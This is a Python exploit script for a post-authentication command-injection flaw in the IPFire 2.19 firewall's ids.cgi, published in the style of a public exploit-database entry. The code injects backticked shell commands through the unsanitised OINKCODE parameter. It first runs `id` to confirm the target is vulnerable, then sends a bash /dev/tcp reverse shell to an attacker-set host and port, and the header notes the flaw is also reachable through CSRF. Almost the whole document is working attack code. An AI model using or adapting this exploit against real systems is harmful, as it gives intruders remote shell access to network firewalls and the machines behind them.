# Title :  IPFire 2.19 Firewall Post-Auth RCE
# Date : 09/06/2017
# Author : 0x09AL (https://twitter.com/0x09AL)
# Tested on: IPFire 2.19 (x86_64) - Core Update 110
# Vendor : http://www.ipfire.org/
# Software : http://downloads.ipfire.org/releases/ipfire-2.x/2.19-core110/ipfire-2.19.x86_64-full-core110.iso
# Vulnerability Description:
# The file ids.cgi doesn&#039;t sanitize the OINKCODE parameter and gets passed to a system call which call wget.
# You need valid credentials to exploit this vulnerability or you can exploit it through CSRF.
# 
#
 
import requests
 
 
# Adjust the ip and ports. 
 
revhost = &#039;192.168.56.1&#039;
revport = 1337
url = &#039;https://192.168.56.102:444/cgi-bin/ids.cgi&#039;
username = &#039;admin&#039;
password = &#039;admin&#039;
 
 
payload = &#039;bash -i >& /dev/tcp/&#039; + revhost + &#039;/&#039; + str(revport) + &#039; 0>&1&#039;
evildata = {&#039;ENABLE_SNORT_GREEN&#039;:&#039;on&#039;,&#039;ENABLE_SNORT&#039;:&#039;on&#039;,&#039;RULES&#039;:&#039;registered&#039;,&#039;OINKCODE&#039;: &#039;`id`&#039;,&#039;ACTION&#039;: &#039;Download new ruleset&#039;,&#039;ACTION2&#039;:&#039;snort&#039;}
headers = {&#039;Accept-Encoding&#039; : &#039;gzip, deflate, br&#039;,&#039;Accept&#039;:&#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,&#039;User-Agent&#039;:&#039;IPFIRE Exploit&#039;,&#039;Referer&#039;: url,&#039;Upgrade-Insecure-Requests&#039;:&#039;1&#039;}
 
 
def verifyVuln():
    req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False) # Verify false is added because most of the time the certificate is self signed.
    if(req.status_code == 200 and "uid=99(nobody)" in req.text):
        print "[+] IPFire Installation is Vulnerable [+]"
        revShell()
    else:
        print "[+] Not Vulnerable [+]"
 
def revShell():
    evildata["OINKCODE"] = &#039;`&#039; + payload + &#039;`&#039;
    print "[+] Sending Malicious Payload [+]"
    req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False)
 
     
verifyVuln()

